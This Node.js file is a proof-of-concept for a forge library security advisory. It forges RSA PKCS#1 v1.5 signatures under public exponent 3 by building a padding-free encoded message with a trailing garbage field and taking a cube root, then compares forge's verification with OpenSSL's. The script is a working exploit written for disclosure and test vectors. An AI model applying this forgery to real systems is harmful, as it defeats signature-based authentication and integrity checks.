#!/usr/bin/env node
'use strict';

// Security Advisory PoC
//
// https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp
//
// This vulnerability was discovered as part of a U.C. Berkeley security
// research project by: Austin Chu, Sohee Kim, and Corban Villa.
//
// Test vectors from this code were added in the RSA unit tests.

const crypto = require('crypto');
const forge = require('../../lib/index');

// DER prefix for PKCS#1 v1.5 SHA-256 DigestInfo, without the digest bytes:
// SEQUENCE {
//   SEQUENCE { OID sha256, NULL },
//   OCTET STRING <32-byte digest>
// }
// Hex: 30 0d 06 09 60 86 48 01 65 03 04 02 01 05 00 04 20
const DIGESTINFO_SHA256_PREFIX = Buffer.from(
  '300d060960864801650304020105000420',
  'hex'
);

const toBig = b => BigInt('0x' + (b.toString('hex') || '0'));
function toBuf(n, len) {
  let h = n.toString(16);
  if (h.length % 2) h = '0' + h;
  const b = Buffer.from(h, 'hex');
  return b.length < len ? Buffer.concat([Buffer.alloc(len - b.length), b]) : b;
}
function cbrtFloor(n) {
  let lo = 0n;
  let hi = 1n;
  while (hi * hi * hi <= n) hi <<= 1n;
  while (lo + 1n < hi) {
    const mid = (lo + hi) >> 1n;
    if (mid * mid * mid <= n) lo = mid;
    else hi = mid;
  }
  return lo;
}
const cbrtCeil = n => {
  const f = cbrtFloor(n);
  return f * f * f === n ? f : f + 1n;
};
function derLen(len) {
  if (len < 0x80) return Buffer.from([len]);
  if (len <= 0xff) return Buffer.from([0x81, len]);
  return Buffer.from([0x82, (len >> 8) & 0xff, len & 0xff]);
}

function forgeStrictVerify(publicPem, msg, sig) {
  // Enable for debugging and test vector generation.
  //console.log({
  //  publicPem,
  //  msg, msg.toString('hex'),
  //  sig: sig.toString('hex')
  //});

  const key = forge.pki.publicKeyFromPem(publicPem);
  const md = forge.md.sha256.create();
  md.update(msg.toString('utf8'), 'utf8');
  try {
    // verify(digestBytes, signatureBytes, scheme, options):
    // - digestBytes: raw SHA-256 digest bytes for `msg`
    // - signatureBytes: binary-string representation of the candidate signature
    // - scheme: undefined => default RSASSA-PKCS1-v1_5
    // - options._parseAllDigestBytes: require DER parser to consume all bytes
    //   (this is forge's default for verify; set explicitly here for clarity)
    return { ok: key.verify(md.digest().getBytes(), sig.toString('binary'), undefined, { _parseAllDigestBytes: true }) };
  } catch (err) {
    return { ok: false, err: err.message };
  }
}

function main() {
  const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', {
    modulusLength: 4096,
    publicExponent: 3,
    privateKeyEncoding: { type: 'pkcs1', format: 'pem' },
    publicKeyEncoding: { type: 'pkcs1', format: 'pem' }
  });

  const jwk = crypto.createPublicKey(publicKey).export({ format: 'jwk' });
  const nBytes = Buffer.from(jwk.n, 'base64url');
  const n = toBig(nBytes);
  const e = toBig(Buffer.from(jwk.e, 'base64url'));
  if (e !== 3n) throw new Error('expected e=3');

  const msg = Buffer.from('forged-message-0', 'utf8');
  const digest = crypto.createHash('sha256').update(msg).digest();
  const algAndDigest = Buffer.concat([DIGESTINFO_SHA256_PREFIX, digest]);

  // Minimal prefix that forge currently accepts: 00 01 00 + DigestInfo + extra OCTET STRING.
  const k = nBytes.length;
  // ffCount can be set to any value at or below 111 and produce a valid signature.
  // ffCount should be rejected for values below 8, since that would constitute a malformed PKCS1 package.
  // However, current versions of node forge do not check for this.
  // Rejection of packages with less than 8 bytes of padding is bad but does not constitute a vulnerability by itself.
  const ffCount = 0;
  // `garbageLen` affects DER length field sizes, which in turn affect how
  // many bytes remain for garbage. Iterate to a fixed point so total EM size is exactly `k`.
  // A small cap (8) is enough here: DER length-size transitions are discrete
  // and few (<128, <=255, <=65535, ...), so this stabilizes quickly.
  let garbageLen = 0;
  for (let i = 0; i < 8; i += 1) {
    const gLenEnc = derLen(garbageLen).length;
    const seqLen = algAndDigest.length + 1 + gLenEnc + garbageLen;
    const seqLenEnc = derLen(seqLen).length;
    const fixed = 2 + ffCount + 1 + 1 + seqLenEnc + algAndDigest.length + 1 + gLenEnc;
    const next = k - fixed;
    if (next === garbageLen) break;
    garbageLen = next;
  }
  const seqLen = algAndDigest.length + 1 + derLen(garbageLen).length + garbageLen;
  const prefix = Buffer.concat([
    Buffer.from([0x00, 0x01]),
    Buffer.alloc(ffCount, 0xff),
    Buffer.from([0x00]),
    Buffer.from([0x30]), derLen(seqLen),
    algAndDigest,
    Buffer.from([0x04]), derLen(garbageLen)
  ]);

  // Build the numeric interval of all EM values that start with `prefix`:
  // - `low`  = prefix || 00..00
  // - `high` = one past (prefix || ff..ff)
  // Then find `s` such that s^3 is inside [low, high), so EM has our prefix.
  const suffixLen = k - prefix.length;
  const low = toBig(Buffer.concat([prefix, Buffer.alloc(suffixLen)]));
  const high = low + (1n << BigInt(8 * suffixLen));
  const s = cbrtCeil(low);
  if (s > cbrtFloor(high - 1n) || s >= n) throw new Error('no candidate in interval');

  const sig = toBuf(s, k);

  const controlMsg = Buffer.from('control-message', 'utf8');
  const controlSig = crypto.sign('sha256', controlMsg, {
    key: privateKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  });

  // forge verification calls (library under test)
  const controlForge = forgeStrictVerify(publicKey, controlMsg, controlSig);
  const forgedForge = forgeStrictVerify(publicKey, msg, sig);

  // Node.js verification calls (OpenSSL-backed reference behavior)
  const controlNode = crypto.verify('sha256', controlMsg, {
    key: publicKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  }, controlSig);
  const forgedNode = crypto.verify('sha256', msg, {
    key: publicKey,
    padding: crypto.constants.RSA_PKCS1_PADDING
  }, sig);

  console.log('control-forge-strict:', controlForge.ok, controlForge.err || '');
  console.log('control-node:', controlNode);
  console.log('forgery (forge library, strict):', forgedForge.ok, forgedForge.err || '');
  console.log('forgery (node/OpenSSL):', forgedNode);
}

main();
